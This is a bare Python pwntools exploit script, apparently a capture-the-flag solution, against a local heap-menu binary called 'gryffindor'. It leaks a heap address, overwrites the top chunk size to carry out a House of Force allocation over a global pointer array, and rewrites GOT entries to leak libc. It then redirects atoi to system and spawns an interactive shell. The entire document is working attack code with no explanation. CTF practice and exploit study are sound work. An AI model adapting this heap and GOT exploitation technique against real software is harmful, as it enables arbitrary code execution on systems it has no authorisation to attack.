from pwn import *

context.log_level = "debug"
global_array = 0x6020e0
atoi_plt = 0x602068
free_plt = 0x602018
puts_call = 0x4006a0

def choose(choice):
	p.sendlineafter('>>', str(choice))

def add(size, index):
	choose(1)
	p.sendlineafter('Enter size of input\n', str(size))
	p.sendlineafter('Enter index\n', str(index))

def delete(index):
	choose(2)
	p.sendlineafter('Enter index\n', str(index))

def edit(index, size, data):
	choose(3)
	p.sendlineafter('Enter index\n', str(index))
	p.sendlineafter('Enter size\n', str(size))
	p.send(data)

p = process('./gryffindor')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
libc_system = libc.symbols['system']
libc_atoi = libc.symbols['atoi']

choose(1337)
heap_leak = p.recvuntil('\n')[:-1]
heap_base = int(heap_leak, 16) - 0x10

add(0x90, 0)
edit(0, 0xa0, 'a'*0x98 + p64(0xffffffffffffffff))
top_chunk_addr = heap_base + 0x1b8

req = global_array - 0x8*4 - top_chunk_addr

add(req, 1)
add(0x90, 0)

edit(0, 0x8*5 , p64(0x0) + p64(0x0) + p64(free_plt) + p64(atoi_plt) +  p64(atoi_plt))
edit(0, 0x7, p64(puts_call)[:7])
delete(1)

atoi_addr = u64(p.recvuntil('\n')[:-1] + '\x00\x00')
libc_base = atoi_addr - libc_atoi
system_addr = libc_base + libc_system

edit(2, 0x8, p64(system_addr))
p.sendline('sh')
p.interactive()




